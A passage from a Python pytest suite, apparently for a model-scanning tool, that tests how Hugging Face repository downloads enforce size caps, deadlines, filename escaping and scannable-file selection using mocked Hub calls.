        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["nested/MODEL.SaFeTeNsOrS"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin", ".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_oversized_selected_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Repository downloads should enforce max-size before snapshot transfer."""
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="pytorch_model.bin", size=700),
            SimpleNamespace(path="model.safetensors", size=500),
        ]

        with pytest.raises(Exception, match="selected Hugging Face files total 1200 bytes exceeds max size 1000 bytes"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin", ".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    @pytest.mark.parametrize("file_size", [None, -1, "100", True])
    def test_download_model_max_size_rejects_unknown_selected_file_size(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        file_size: object,
    ) -> None:
        """Unknown selected file sizes should fail closed before download."""
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=file_size)]

        with pytest.raises(Exception, match=r"unknown size for selected file pytorch_model\.bin"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_missing_selected_file_metadata(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Missing metadata for a selected file should fail closed under a cap."""
        mock_get_paths_info.return_value = []

        with pytest.raises(Exception, match=r"unknown size for selected file pytorch_model\.bin"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_allows_under_limit_selected_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Under-limit repository downloads should still use selective allow patterns."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=700)]

        download_model("https://huggingface.co/test/model", max_size=1000)

        mock_get_paths_info.assert_called_once_with("test/model", ["pytorch_model.bin"], revision=_HF_TEST_REVISION)
        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_underreported_snapshot(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Capped repository downloads should verify selected files after transfer."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"oversized")
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=4)]

        with pytest.raises(Exception, match="downloaded selected Hugging Face files total 9 bytes exceeds max size 4"):
            download_model("https://huggingface.co/test/model", max_size=4)

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_zero_max_size_preserves_unlimited_behavior(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero cap should keep the documented unlimited-size behavior."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model", max_size=0)

        mock_get_paths_info.assert_not_called()
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._list_repo_files_with_timeout")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_negative_max_size_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        mock_list_repo_files: MagicMock,
    ) -> None:
        """Negative repository download limits should never silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum download size must be non-negative"):
            download_model("https://huggingface.co/test/model", max_size=-1)

        mock_list_repo_files.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model[latest].bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_escapes_literal_selected_filenames(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Budgeted literal filenames must not widen into Hub glob matches."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "model[latest].bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="model[latest].bin", size=700)]

        download_model("https://huggingface.co/test/model", max_size=1000)

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["model[[]latest].bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_without_scannable_files_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """A cap must not re-enable full-repository fallback when routing finds no model."""
        with pytest.raises(Exception, match="repository listing contains no recognized ModelAudit-scannable files"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_get_paths_info.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repository listing unavailable"),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_max_size_rejects_listing_failure_before_extension_allowlist(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """When max-size is set, listing failures cannot fall back to broad extension globs."""
        with pytest.raises(Exception, match="selective filtering incomplete: failed listing files"):
            download_model("https://huggingface.co/test/model", max_size=1000)

        mock_snapshot_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    @patch("shutil.rmtree")
    def test_download_model_cleanup_on_failure(
        self,
        mock_rmtree: MagicMock,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Test that temporary directory is cleaned up on download failure."""
        # Make snapshot_download raise an exception
        mock_snapshot_download.side_effect = Exception("Download failed")

        # Test download failure
        with pytest.raises(Exception, match="Failed to download model"):
            download_model("https://huggingface.co/test/model")

        # Verify cleanup was attempted (only if temp dir was created)
        # Since we're mocking, we can't verify the exact behavior, but the code handles it

    def test_download_invalid_url(self):
        """Test that invalid URLs raise appropriate errors."""
        with pytest.raises(ValueError):
            download_model("https://github.com/user/repo")

    def test_missing_huggingface_hub_dependency(self):
        """Test error when huggingface-hub is not installed."""
        real_import = __import__
        with patch("builtins.__import__") as mock_import:

            def side_effect(name, *args, **kwargs):
                if name == "huggingface_hub":
                    raise ImportError("No module named 'huggingface_hub'")
                return real_import(name, *args, **kwargs)

            mock_import.side_effect = side_effect
            with pytest.raises(ImportError, match="huggingface-hub package is required"):
                download_model("https://huggingface.co/test/model")


class TestModelDownloadStreaming:
    """Test streaming model downloads from HuggingFace."""

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_download_with_deadline")
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    def test_download_model_streaming_bounds_each_transfer(
        self,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        mock_run_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Each streaming transfer should receive the shared acquisition deadline."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        downloaded_file.write_bytes(b"weights")
        mock_run_download.return_value = str(downloaded_file)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                timeout_seconds=30,
            )
        )

        assert results == [(downloaded_file, True)]
        operation, kwargs, deadline, repo_id = mock_run_download.call_args.args
        assert operation == "hf_hub_download"
        assert kwargs["filename"] == "pytorch_model.bin"
        assert deadline > time.monotonic()
        assert repo_id == "test/model"

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "README.md"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_downloads_scannable_files_only(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should only request recognized scannable files."""
        downloaded_file = tmp_path / "huggingface" / "test" / "model" / "pytorch_model.bin"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", cache_dir=tmp_path))

        assert results == [(downloaded_file, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=_HF_TEST_REVISION,
            cache_dir=str(tmp_path / "huggingface"),
            local_dir=str(tmp_path / "huggingface" / "test" / "model"),
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_includes_content_routed_skipped_file(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should include renamed content-routed model files."""

        def get_side_effect(url: str, **_kwargs: object) -> _FakeRangeResponse:
            if url.endswith("/evil.payload"):
                return _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
            return _FakeRangeResponse(b"\x89PNG\r\n\x1a\n" + b"\x00" * 16)

        def download_side_effect(*, repo_id: str, filename: str, **_kwargs: object) -> str:
            assert repo_id == "test/model"
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_requests_get.side_effect = get_side_effect
        mock_hf_hub_download.side_effect = download_side_effect

        results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(tmp_path / "pytorch_model.bin", False), (tmp_path / "evil.payload", True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "pytorch_model.bin",
            "evil.payload",
        ]
        assert all(call.kwargs["revision"] == _HF_TEST_REVISION for call in mock_hf_hub_download.call_args_list)
        assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)

    @patch("modelaudit.utils.sources.huggingface.time.monotonic", return_value=100.0)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_deadline_stops_content_probes(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_monotonic: MagicMock,
    ) -> None:
        """The scan deadline should stop acquisition before a late remote probe begins."""

        def finish_listing_after_deadline(
            *_args: object,
            **_kwargs: object,
        ) -> tuple[list[str], str, None]:
            _mock_monotonic.return_value = 102.0
            return ["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None

        _mock_list_repo_files.side_effect = finish_listing_after_deadline

        with pytest.raises(Exception, match=r"hidden\.payload \(TimeoutError\)"):
            list(download_model_streaming("https://huggingface.co/test/model", timeout_seconds=1))

        _mock_list_repo_files.assert_called_once_with("test/model", 1.0, deadline=101.0)
        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_large_extensionless_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Streaming mode must fail closed when extensionless candidates exceed the bounded limit."""
        repo_files = [f"payloads/chunk-{idx:04d}" for idx in range(1000)]
        repo_files.extend(["README.md", "config", "tokenizer"])

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(
                Exception,
                match="Refusing to stream-download extensionless files from test/model: "
                "repository listing exceeds the bounded extensionless candidate limit",
            ),
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin", ".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.safetensors"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_max_size_rejects_oversized_selected_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Streaming mode should enforce max-size before downloading selected files."""
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="pytorch_model.bin", size=700),
            SimpleNamespace(path="model.safetensors", size=500),
        ]

        with pytest.raises(Exception, match="selected Hugging Face files total 1200 bytes exceeds max size 1000 bytes"):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=1000))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_large_uninspected_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Recognized suffixes must not hide unknown files beyond the inspection cap."""
        repo_files = [f"payloads/chunk-{idx:04d}.blob" for idx in range(1000)]
        repo_files.extend(["README.md", "pytorch_model.bin", "nested/adapter.bin", "config.blob"])

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(Exception, match="skipped file inspection limit exceeded"),
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        assert _mock_detect_content.call_count == 256
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".txt"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["malicious.blob", "benign.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_preserves_unknown_suffix_candidates(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Header-routed scans must not drop malicious content behind an unknown suffix."""
        malicious_path = tmp_path / "malicious.blob"
        benign_path = tmp_path / "benign.txt"
        mock_hf_hub_download.side_effect = [str(malicious_path), str(benign_path)]

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                include_all_files=True,
            )
        )

        assert results == [(malicious_path, False), (benign_path, True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "malicious.blob",
            "benign.txt",
        ]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_include_all_unknown_suffix_overflow_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Incomplete unknown-suffix coverage must fail before downloading recognized files."""
        repo_files = ["model.bin", *(f"payloads/chunk-{idx:04d}.blob" for idx in range(129))]

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(Exception, match="repository listing exceeds the bounded unfiltered candidate limit"),
        ):
            list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    include_all_files=True,
                )
            )

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_max_size_rejects_unknown_selected_file_size(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Streaming mode should fail closed on unknown selected file size."""
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=None)]

        with pytest.raises(Exception, match=r"unknown size for selected file pytorch_model\.bin"):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=1000))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_max_size_allows_under_limit_selected_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Under-limit streaming mode should still download selected files."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        downloaded_file.write_bytes(b"weights")
        mock_get_paths_info.return_value = [SimpleNamespace(path="pytorch_model.bin", size=700)]
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", max_size=1000))

        assert results == [(downloaded_file, True)]
        mock_get_paths_info.assert_called_once_with("test/model", ["pytorch_model.bin"], revision=_HF_TEST_REVISION)
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["first.bin", "second.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_rejects_underreported_cumulative_download(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming mode should verify the cumulative downloaded bytes, not each file alone."""
        first_file = tmp_path / "first.bin"
        second_file = tmp_path / "second.bin"
        first_file.write_bytes(b"1234")
        second_file.write_bytes(b"5678")
        mock_hf_hub_download.side_effect = [str(first_file), str(second_file)]
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="first.bin", size=3),
            SimpleNamespace(path="second.bin", size=3),
        ]

        with pytest.raises(
            Exception,
            match=r"downloaded bytes plus selected file second\.bin would total 7 bytes, exceeding max size 6",
        ):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=6))

        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="first.bin",
            revision=_HF_TEST_REVISION,
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["first.bin", "second.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_allows_underreported_files_within_cumulative_limit(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Actual bytes may exceed metadata when the cumulative download still fits."""
        first_file = tmp_path / "first.bin"
        second_file = tmp_path / "second.bin"
        first_file.write_bytes(b"123")
        second_file.write_bytes(b"45")
        mock_hf_hub_download.side_effect = [str(first_file), str(second_file)]
        mock_get_paths_info.return_value = [
            SimpleNamespace(path="first.bin", size=2),
            SimpleNamespace(path="second.bin", size=2),
        ]

        results = list(download_model_streaming("https://huggingface.co/test/model", max_size=6))

        assert results == [(first_file, False), (second_file, True)]
        assert mock_hf_hub_download.call_count == 2

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_zero_max_size_preserves_unlimited_behavior(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A zero streaming cap should preserve the documented unlimited-size behavior."""
        downloaded_file = tmp_path / "pytorch_model.bin"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", max_size=0))

        assert results == [(downloaded_file, True)]
        mock_get_paths_info.assert_not_called()
        assert mock_hf_hub_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @patch("modelaudit.utils.sources.huggingface._list_repo_files_with_timeout")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_negative_max_size_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        mock_list_repo_files: MagicMock,
    ) -> None:
        """Negative streaming limits should never silently disable enforcement."""
        with pytest.raises(Exception, match="Maximum download size must be non-negative"):
            list(download_model_streaming("https://huggingface.co/test/model", max_size=-1))

        mock_list_repo_files.assert_not_called()
        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["MODEL.SaFeTeNsOrS"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_accepts_mixed_case_scannable_suffix(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should recognize mixed-case supported suffixes."""
        downloaded_file = tmp_path / "MODEL.SaFeTeNsOrS"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(downloaded_file, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="MODEL.SaFeTeNsOrS",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["llama"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_preserves_supported_extensionless_candidate(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A bounded extensionless listing should still reach content-routed scanners."""
        model_path = tmp_path / "llama"
        mock_hf_hub_download.return_value = str(model_path)

        results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(model_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="llama",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["README", "weights.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_preserves_selected_extensionless_filename(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selected metadata scans should retain extensionless filename-routed candidates."""
        readme_path = tmp_path / "README"
        mock_hf_hub_download.return_value = str(readme_path)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".md", ".txt"},
                scannable_filenames={"readme", "model_card"},
            )
        )

        assert results == [(readme_path, True)]
        assert mock_hf_hub_download.call_count == 1
        assert mock_hf_hub_download.call_args.kwargs["filename"] == "README"

    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_filename_ignores_unrelated_extensionless_files(
        self,
        mock_hf_hub_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename routes must not widen selected scans to every extensionless file."""
        repo_files = ["README", *(f"payloads/chunk-{idx:04d}" for idx in range(129))]
        readme_path = tmp_path / "README"
        mock_hf_hub_download.return_value = str(readme_path)

        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    cache_dir=tmp_path,
                    scannable_extensions={".md", ".txt"},
                    scannable_filenames={"readme", "model_card"},
                )
            )

        assert results == [(readme_path, True)]
        assert mock_hf_hub_download.call_count == 1
        assert mock_hf_hub_download.call_args.kwargs["filename"] == "README"

    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_exact_filenames_deduplicate_and_use_posix_paths(
        self,
        mock_hf_hub_download: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Duplicate names should not consume the cap, and backslashes are not Hub separators."""
        repo_files = [*("README" for _ in range(129)), r"docs\README"]
        readme_path = tmp_path / "README"
        mock_hf_hub_download.return_value = str(readme_path)
